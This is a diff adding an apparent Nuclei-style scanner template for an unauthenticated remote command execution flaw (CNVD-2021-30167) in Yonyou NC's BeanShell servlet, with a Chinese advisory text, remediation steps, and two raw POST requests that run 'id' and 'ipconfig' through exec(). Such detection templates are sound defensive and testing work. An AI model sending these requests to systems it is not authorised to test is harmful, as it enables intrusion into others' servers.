@@ -1,0 +1,48 @@
+id: CNVD-2021-30167
+info:
+  name: UFIDA NC BeanShell Remote Code Execution
+  author:
+  - l0ne1y
+  description: |-
+    用友NC bsh.servlet.BshServlet 远程命令执行漏洞
+    用友 NC bsh.servlet.BshServlet 存在远程命令执行漏洞，该漏洞为远程命令执行漏洞，在无需登陆系统的情况下，攻击者可通过BeanShell测试接口（BeanShell可以直接执行java代码，适用于测试java代码的接口）直接执行任意命令，恶意攻击者成功利用该漏洞可获得目标系统管理权限。
+  reference:
+  - https://mp.weixin.qq.com/s/fvqc1i_g14aeqnztu0zn8a
+  - https://www.cnvd.org.cn/webinfo/show/6491
+  severity: high
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+    补丁地址: [http://umc.yonyou.com/ump/querypatchdetailedmng?PK=18981c7af483007db179a236016f594d37c01f22aa5f5d19](http://umc.yonyou.com/ump/querypatchdetailedmng?PK=18981c7af483007db179a236016f594d37c01f22aa5f5d19)
+
+    #### 临时修复方案：
+    1、尽量不去执行外部的应用程序或命令。
+    2、使用自定义函数或函数库实现外部应用程序或命令的功能。
+    3、在执行exec类似命令执行功能的函数前，校验参数内容。
+requests:
+- matchers:
+  - type: regex
+    condition: or
+    regex:
+    - uid=
+    - Windows IP
+  - type: word
+    words:
+    - BeanShell Test Servlet
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  raw:
+  - |
+    POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    bsh.script=exec("id");
+  - |
+    POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    bsh.script=exec("ipconfig");
